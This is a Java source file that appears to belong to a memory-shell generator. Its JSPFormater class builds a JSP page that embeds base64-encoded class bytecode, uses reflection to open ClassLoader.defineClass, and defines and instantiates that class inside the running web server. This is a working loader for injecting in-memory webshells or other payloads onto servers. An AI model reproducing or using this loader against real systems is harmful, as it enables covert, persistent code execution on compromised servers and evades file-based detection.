package jmg.core.format;

import jmg.core.config.AbstractConfig;
import me.gv7.woodpecker.tools.codec.BASE64Encoder;

import java.io.IOException;

public class JSPFormater implements IFormater {

    public byte[] transform(byte[] clazzbyte, AbstractConfig config) throws IOException {
        String strJSP = "<%\n" +
                "    ClassLoader classLoader = Thread.currentThread().getContextClassLoader();\n" +
                "    try{\n" +
                "        classLoader.loadClass(\""+ config.getInjectorClassName()+"\").newInstance();\n" +
                "    }catch (Exception e){\n" +
                "        java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
                "        defineClass.setAccessible(true);\n" +
                "        String bytecodeBase64 = \""+new BASE64Encoder().encode(clazzbyte).replace("\n", "").replace("\r", "") +"\";\n" +
                "        byte[] bytecode = null;\n" +
                "        try {\n" +
                "            Class base64Clz = classLoader.loadClass(\"java.util.Base64\");\n" +
                "            Class decoderClz = classLoader.loadClass(\"java.util.Base64$Decoder\");\n" +
                "            Object decoder = base64Clz.getMethod(\"getDecoder\").invoke(base64Clz);\n" +
                "            bytecode = (byte[]) decoderClz.getMethod(\"decode\", String.class).invoke(decoder, bytecodeBase64);\n" +
                "        } catch (ClassNotFoundException ee) {\n" +
                "            Class datatypeConverterClz = classLoader.loadClass(\"javax.xml.bind.DatatypeConverter\");\n" +
                "            bytecode = (byte[]) datatypeConverterClz.getMethod(\"parseBase64Binary\", String.class).invoke(datatypeConverterClz, bytecodeBase64);\n" +
                "        }\n" +
                "        Class clazz = (Class)defineClass.invoke(classLoader,bytecode,0,bytecode.length);\n" +
                "        clazz.newInstance();\n" +
                "    }\n" +
                "%>";
        return strJSP.getBytes();
    }
}
